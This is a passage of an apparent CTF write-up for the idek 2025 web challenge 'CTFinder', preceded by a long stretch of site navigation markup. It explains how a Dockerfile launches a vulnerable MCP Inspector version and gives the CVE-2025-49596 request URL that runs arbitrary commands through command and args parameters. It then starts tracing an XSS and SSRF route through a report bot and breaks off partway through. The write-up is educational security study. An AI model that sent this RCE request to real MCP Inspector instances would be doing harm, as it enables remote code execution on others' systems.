stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 1</span></a><a href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 6</span></a><a href="/ctf-writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Proto Grader</span></a><a href="/ctf-writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 5</span></a><a href="/ctf-writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">the other obligatory pyjail</span></a><!--]--></div><!--]--></div></div></div></div><div class="dotted-line-hori z-10 w-[calc(100vw-5rem)] max-sm:w-screen"></div></div><div class="fixed z-10 w-[17.5rem] h-screen overflow-y-hidden flex max-xl:hidden"><div class="flex flex-col hide-scrollbar h-full overflow-y-auto pt-24 pr-5"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">idek 2025</span><!--[--><a aria-current="page" href="/ctf-writeups/ctfinder" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-primary" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10 text-primary">CTFinder</span></a><a href="/ctf-writeups/jnotes" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">jnotes</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Codegate 2025 Quals</span><!--[--><a href="/ctf-writeups/masquerade" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Masquerade</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 1</span></a><a href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 6</span></a><a href="/ctf-writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Proto Grader</span></a><a href="/ctf-writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 5</span></a><a href="/ctf-writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">the other obligatory pyjail</span></a><!--]--></div><!--]--></div><div class="dotted-line-vert h-auto mb-10"></div></div><div class="relative flex flex-col items-center break-words max-w-[89rem] mx-auto px-[20.5rem] pt-24 pb-14 max-xl:ml-0 max-xl:pl-12 max-lg:mr-0 max-lg:pr-12 max-md:px-8 max-sm:px-5"><div class="w-full flex flex-col items-start"><span class="text-xl opacity-60 mb-1">06/08/2025</span><h1 class="mb-7">CTFinder</h1><div class="markdown mb-7 flex flex-col gap-y-3"><p>I made a chat service where you can have CTF related conversations using ctftime MCP!</p>
<p>Oh but it's still in beta so I haven't actually applied MCP to the service yet and am just testing.. there shouldn't be any problems right?</p>
<ul>
<li>MCP server may take some time to start up (3-5 seconds)</li>
<li>Challenge can be solved without Claude API key</li>
<li>Use "localhost" instead of container names in the instance server</li>
</ul>
<p><a href="https://instancer.idek.team/challenge/ctfinder">Instancer</a></p>
</div><div class="flex flex-wrap gap-3"><!--[--><div class="h-9 bg-white rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-2 text-black">language</i><span class="mr-4 text-black font-semibold">web</span></div><!--]--><div class="h-9 bg-almost-black rounded-full px-5 flex items-center"><span class="mr-4">8 solves</span><span class="opacity-60">457 points</span></div><div class="h-9 bg-almost-black rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-3">person</i><span class="mr-4">by p1ain</span></div></div><div class="w-full flex border border-almost-black-lighter rounded-2.5xl mt-7 mb-9 max-sm:flex-col"><div class="flex-1 flex flex-col gap-y-2 px-6 pt-4 pb-5"><span>Attachments</span><!--[--><a href="https://idekctf-challenges.storage.googleapis.com/uploads/caff3c4cef7824728da40a4bb17322cfbc1006b9459c63f5bdd6a45a1ee5f1b6/ctfinder.tar.gz" class="underline">ctfinder.tar.gz</a><!--]--></div><button class="pl-9 pr-10 font-semibold flex items-center border-l border-almost-black-lighter rounded-tr-2.5xl rounded-br-2.5xl transition-colors hover:bg-almost-black active:bg-almost-black-lighter max-sm:border-l-0 max-sm:border-t max-sm:pl-6 max-sm:py-4 max-sm:rounded-tr-none max-sm:rounded-bl-2.5xl"><i class="material-symbols-outlined text-2xl mr-4">download</i> Download all </button></div></div><div id="article" class="markdown w-full flex flex-col gap-y-3 px-4 max-md:px-0"><p>Looking at the provided challenge source, there are 4 services:</p>
<pre class="named-fence-block"><code class="language-yaml">version: "3.8"

services:
  main:
    build: ./web
    ports:
      - "1337:1337"
...

  redis:
    image: redis:7-alpine
...

  bot:
    build: ./bot
...

  mcp-server:
    build: ./mcp-server
...
</code><div class="named-fence-filename">docker-compose.yml</div></pre>
<p>All these services are on the same network, however only <code>main</code> is exposed on port 1337.</p>
<p><img src="/ctf-writeups/idek25/ctfinder-preview.png" alt=""></p>
<h1 id="rce-on-mcp-server" tabindex="-1">RCE on mcp-server</h1>
<p>The codebase is pretty large, so I decided to work backwards. The flag is in <code>/app/flag.txt</code> on mcp-server. It is not referenced anywhere else in the code, leading me to believe we either need LFI or RCE on this container.</p>
<p>I began by checking for package vulnerabilities with snyk (I do this everytime there's a challenge with external packages, to get known CVEs out of the way):</p>
<pre><code class="language-plaintext">$ python -m venv venv
$ source venv/bin/activate
$ pip install -r requirements.txt
$ snyk test --file=requirements.txt
</code></pre>
<p>This yielded no results, so I continued on to server.py. As expected, it's a FastAPI MCP server that provides tools to scrape ctftime.org. But to make a long story short, I did not find any vulnerabilities that could lead to RCE. This was until I took a closer look at the Dockerfile, and found a (somewhat) sneakily hidden command on the last line:</p>
<pre><code class="language-Dockerfile">...
CMD ["bash", "-c", "echo 'Starting MCP Inspector for debugging...' &amp;&amp; export npm_config_cache=/tmp/.npm-cache &amp;&amp; mkdir -p /tmp/.npm-cache &amp;&amp; npx @modelcontextprotocol/inspector@0.13.0 python server.py"]
</code></pre>
<p><code>@modelcontextprotocol/inspector</code> introduces itself as " a developer tool for testing and debugging MCP servers". More importantly, it has a known RCE vulnerability for versions <code>&lt;0.14.1</code>: <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49596">CVE-2025-49596</a>. I looked through this <a href="https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596">blog post</a> to get an idea of how it works, but the important part was just this url:</p>
<pre><code class="language-plaintext">http://0.0.0.0:6277/sse?transportType=stdio&amp;command=touch&amp;args=%2Ftmp%2Fexploited-from-the-browser
</code></pre>
<p>The exploit is pretty self explanatory, we just need the server to send a GET request to this endpoint, specifying the desired <code>command</code> and <code>args</code> parameters.</p>
<h1 id="finding-the-xss-source" tabindex="-1">Finding the XSS source</h1>
<p>With the endpoint in mind, I went back to the <code>web</code> folder. The <code>bot</code> container sounds like the perfect candidate to achieve such SSRF, so I looked for a way to access it from the public web interface. My search led me to the /report endpoint:</p>
<pre class="named-fence-block"><code class="language-python">@session_bp.route('/&lt;session_id&gt;/report', methods=['GET'])
@login_required
@token_required
def get_report(session_id):
    user_id = flask_session['user_id']

    redis = get_redis()
    report = redis.get(f"session:{session_id}:{user_id}:report")

    if not report:
        return jsonify({'error': 'No report found'}), 404

    url = f"http://bot:5010/?session_id={session_id}&amp;user_id={user_id}"
    res = requests.get(url)

    if res.json().get('message') != "Bot visited the URL":
        return jsonify({'error': 'Failed to get report'}), 400
    
    redis.delete(f"session:{session_id}:{user_id}:report")

    return jsonify({'message': 'Report sent'}), 200
</code><div class="named-fence-filename">web/sessions/routes.py</div></pre>
<p>However, before making any request, we need the <code>session:{session_id}:{user_id}:report</code> key to be set in redis. It's set in only one place: <code>stream_claude_response</code>:</p>
<pre class="named-fence-block"><code class="language-python">def stream_claude_response(app, session_id, user_id, content, parent_message_id, stream_channel):
    with app.app_context():
        ...

        response = requests.post(
            "https://api.anthropic.com/v1/messages",
            headers=headers,
            json=request_body,
            stream=True
        )
        
        if not response.ok:
            ...
            
            redis.set(f"session:{session_id}:{user_id}:report", json.dumps({
                "event": "error",
                "meta": json.loads(redis.get(stream_channel.replace('stream', 'meta'))),
                "message_id": assistant_message_id,
                "message": error_message
            }))

...
</code><div class="named-fence-filename">web/sessions/stream.py</div></pre>
<p>The function calls the claude API to get the LLM's response, and creates the report key in event of an error. It is referenced in only one location:</p>
<pre class="named-fence-block"><code class="language-python">@session_bp.route('/&lt;session_id&gt;/messages', methods=['POST'])
@login_required
@token_required
def create_message(session_id):
    ...

    # this sanitizer part will be discussed later
    sanitizer = Sanitizer(content)  # content = request.get_json().get('content')

    if sanitizer.check(session_id, user_id):
        content = sanitizer.sanitize()
    
    ...

    thread = threading.Thread(
        target=stream_claude_response,
        args=(current_app._get_current_object(), session_id, user_id, content, message_id, stream_channel)
    )

    thread.daemon = True
    thread.start()

...
</code><div class="named-fence-filename">web/sessions/routes.py</div></pre>
<p>So we need to create a message that triggers a claude API error. Luckily, this is quite easy to do by simply providing an invalid API key. (Recall that the challenge description stated you don't need a valid claude API key.) Thereafter, we can report the session and trigger the bot.</p>
<p>Note that in the code above, there is also some sanitization done, the first of a few hurdles we will have to overcome to obtain XSS.</p>
<p>Once triggered, the bot will visit the <code>/session/{session_id}</code> endpoint:</p>
